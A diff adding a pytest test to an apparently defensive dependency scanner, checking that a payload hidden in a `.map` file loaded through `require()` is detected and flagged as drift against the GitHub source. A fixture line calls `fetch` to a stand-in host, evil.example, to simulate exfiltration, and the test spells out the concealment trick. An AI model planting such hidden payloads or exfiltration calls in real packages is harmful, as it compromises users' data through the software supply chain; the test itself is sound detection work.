@@ -20,7 +20,7 @@ from backend.deps import scanner
 from backend.deps.delta import compute_delta
 from backend.deps.drift import compare_sources
 from backend.models.dependencies import ResolvedPackage
-from backend.models.enums import SourceKind
+from backend.models.enums import CapabilityCategory, PathClass, SourceKind
 
 
 pytestmark = pytest.mark.skipif(
@@ -351,6 +351,43 @@ async def test_install_hook_target_requiring_a_test_payload_is_forced_shipped(tm
     assert all(e.path_class == PathClass.SHIPPED for e in payload_evidence)
     assert all(e.reclassified_from == PathClass.TEST for e in payload_evidence)
     assert all(e.install_time for e in payload_evidence)
+
+
+@pytest.mark.asyncio
+async def test_non_js_extension_reachable_file_is_scanned_and_signalled(tmp_path):
+    """Node executes whatever a require() resolves to, extension or not — a
+    payload hidden behind `require('./lib/data.map')` must not be invisible
+    just because Semgrep doesn't scan `.map` files by default, and drift must
+    not silently wave the file through as if it were ordinary sourcemap
+    metadata just because of its extension."""
+    curr_dir, curr_content = _fetched(tmp_path, "curr", "package")
+    _write(curr_content, "package.json", json.dumps({"name": "map-pkg", "version": "1.0.0"}))
+    _write(curr_content, "index.js", "require('./lib/data.map');\nmodule.exports = {};\n")
+    _write(
+        curr_content,
+        "lib/data.map",
+        "fetch('https://evil.example/exfil', {method: 'POST'});\nmodule.exports = {};\n",
+    )
+
+    github_dir, github_content = _fetched(tmp_path, "github", "map-pkg-abc123")
+    _write(github_content, "package.json", json.dumps({"name": "map-pkg", "version": "1.0.0"}))
+    _write(github_content, "index.js", "module.exports = {};")
+
+    profile = await _scan(curr_dir, "map-pkg", "1.0.0")
+
+    assert CapabilityCategory.NETWORK in profile.category_set()
+    payload_evidence = [
+        e for e in profile.evidence if e.file.replace("\\", "/").endswith("lib/data.map")
+    ]
+    assert payload_evidence, "expected evidence from lib/data.map"
+    assert all(e.path_class == PathClass.SHIPPED for e in payload_evidence)
+
+    github_profile = await _scan(github_dir, "map-pkg", "1.0.0", kind=SourceKind.GITHUB)
+    drift = compare_sources("map-pkg", "1.0.0", curr_dir, profile, github_dir, github_profile)
+    assert drift.status == "compared"
+    assert "lib/data.map" in drift.unexplained
+    assert drift.signal is True
+    assert "lib/data.map" in drift.signal_files
 
 
 @pytest.mark.asyncio
